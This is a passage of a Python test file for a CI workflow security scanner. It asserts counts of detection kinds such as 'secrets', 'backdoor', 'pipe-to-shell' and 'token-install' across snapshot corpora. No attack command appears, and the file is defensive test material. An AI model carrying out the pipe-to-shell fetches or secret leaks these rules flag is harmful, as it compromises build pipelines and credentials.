        answers = _snapshots.run(snapshot_sets()[name]())
        self.assertFalse([a for a in answers if "ok" not in a][:5])
        _snapshots.check(self, name, answers)
        return [a["ok"] for a in answers]

    def test_outlines(self):
        got = self.answers("ci_outline")
        self.assertGreater(sum(len(r) for r in got), 100_000)                  # the corpora are read, line by line
        self.assertTrue(any(r.get("block") for rs in got for r in rs))           # block scalars among them
        self.assertTrue(any(r.get("item") for rs in got for r in rs))

    def test_workflows(self):
        got = self.answers("ci_workflow")
        kinds = [f[0] for a in got[0::3] for part in ("findings", "hardening") for f in a[part]]
        self.assertGreater(kinds.count("secrets"), 300)
        self.assertGreater(kinds.count("backdoor"), 100)
        for kind in ("unpinned", "pr-checkout", "cache", "perms", "perms-missing", "oidc-install", "pipe-to-shell"):
            self.assertGreater(kinds.count(kind), 60, kind)
        self.assertGreater(sum(len(u) for u in got[1::3]), 3000)
        rules = {r["id"] for issues in got[2::3] for _line, r in issues}
        self.assertTrue({"SC-WORKFLOW-SECRETS", "SC-WORKFLOW-BACKDOOR", "SC-WORKFLOW-UNPINNED"} <= rules, rules)

    def test_gitlab_files(self):
        got = self.answers("ci_gitlab")
        kinds = [f[0] for a in got[0::2] for f in a["hardening"]]
        for kind in ("include-remote", "include-project", "include-component", "image", "pipe-to-shell", "mr-text",
                     "token-install"):
            self.assertGreater(kinds.count(kind), 80, kind)
        self.assertEqual(sum(len(i) for i in got[1::2]), len(kinds))           # every finding is an issue

    def test_helpers(self):
        got = self.answers("ci_helpers")
        n = len(script_lines_corpus())
        checks = [got[i * len(CHECKS):(i + 1) * len(CHECKS)] for i in range(n)]
        piped = [c[0] for c in checks if c[0] is not None]
        self.assertGreater(len(piped), 25)                    # fetches that run, and ones that don't
        self.assertGreater(n - len(piped), 40)
        mr = [c[3] for c in checks]
        self.assertGreater(sum(m is not None for m in mr), 12)
        self.assertGreater(sum(m is None for m in mr), 12)
        joined = got[-len(groups()):]
        self.assertTrue(any(len(j) != len(g) for j, g in zip(joined, groups())))   # some lines were joined


if __name__ == "__main__":
    unittest.main()
